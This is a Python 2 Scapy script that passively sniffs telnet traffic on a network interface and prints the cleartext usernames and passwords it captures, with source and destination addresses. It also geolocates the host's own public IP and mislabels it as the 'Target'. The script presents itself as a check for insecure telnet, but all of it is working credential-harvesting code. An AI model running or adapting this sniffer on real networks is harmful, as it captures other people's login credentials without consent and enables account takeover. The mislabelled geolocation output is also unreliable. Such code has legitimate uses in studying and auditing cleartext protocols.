#!	/usr/bin/python

import sys
import ipgetter
import binascii
import struct
import base64
import pygeoip
from subprocess import Popen, PIPE
from collections import OrderedDict
from StringIO import StringIO
gi = pygeoip.GeoIP('GeoLiteCity.dat')

from logging import getLogger, ERROR
getLogger('scapy.runtime').setLevel(ERROR)
try:
	from scapy.all import *
except ImportError:
	print '[!] Error: Could not find Scapy installation'
	sys.exit(1)

interface = sys.argv[1]

telnet_stream = OrderedDict()

usernames = ['Error: Could not sniff username']
passwords = ['Error: Could not sniff password']


def validate_packet(packet):
	if validate_for_telnet(packet):
		pass
	else:
		return
	data = packet[Raw].load
	src_ip=str(packet[IP].src)+":"+str(packet[TCP].sport)
	dst_ip=str(packet[IP].dst)+":"+str(packet[TCP].dport)
	validate_telnet_login(src_ip , dst_ip, data)

def validate_telnet_login(src_ip , dst_ip, data):
#Catch telnet logins and passwords
    global telnet_stream
    msg = None
    if src_ip in telnet_stream:
    	try:
        	telnet_stream[src_ip] += data.decode('utf8')
    	except UnicodeDecodeError:
           pass 
  
        # \r or \r\n or \n terminate commands in telnet if my pcaps are to be believed
        if '\r' in telnet_stream[src_ip ] or '\n' in telnet_stream[src_ip ]:
            telnet_split = telnet_stream[src_ip ].split(' ', 1)
            cred_type = telnet_split[0]
            value = telnet_split[1].replace('\r\n', '').replace('\r', '').replace('\n', '')
            # Create msg, the return variable
            msg = 'Telnet %s: %s' % (cred_type, value)
            print msg + '\n'
            print '[*] Source: ' + src_ip.split(':')[0]+'->' + '[*] Destination:' + dst_ip.split(':')[0]
            src_tmp=str(ipgetter.myip())
            print 'Unsecured telnet access from: '
            printRecord(src_tmp)
            del telnet_stream[src_ip]

    # This part relies on the telnet packet ending in
    # "login:", "password:", or "username:" 
    if len(telnet_stream) > 100:
        telnet_stream.popitem(last=False) 
    mod_load = data.lower().strip()
    if mod_load.endswith('username:') or mod_load.endswith('login:'):
    	telnet_stream[dst_ip] = 'username '
    elif mod_load.endswith('password:'):
		telnet_stream[dst_ip] = 'password '

def validate_for_telnet(packet):
	if packet.haslayer(TCP) and packet.haslayer(Raw):
		if packet[TCP].dport == 23 or packet[TCP].sport == 23:
			return True
		else:
			return False
	else:
		return False

def printRecord(src_tmp):
	rec = gi.record_by_name(src_tmp)
	city = rec['city']
	#region = rec['region_name']
	country = rec['country_name']
	long = rec['longitude']
	lat = rec['latitude']
	print '[*] Target: ' + src_tmp + ' Geo-located. '
	print '[+] '+str(city)+', '+str(country)
	print '[+] Latitude: '+str(lat)+ ', Longitude: '+ str(long)

print '[*] Sniffing Started on %s... \n' % interface


try:
   	 sniff(iface=interface, prn=validate_packet, store=0,timeout=100)
except Exception,e:
	print 'Exception here:' + str(e)
	print '[!] Error: Failed to Initialize Sniffing process'
	sys.exit(1)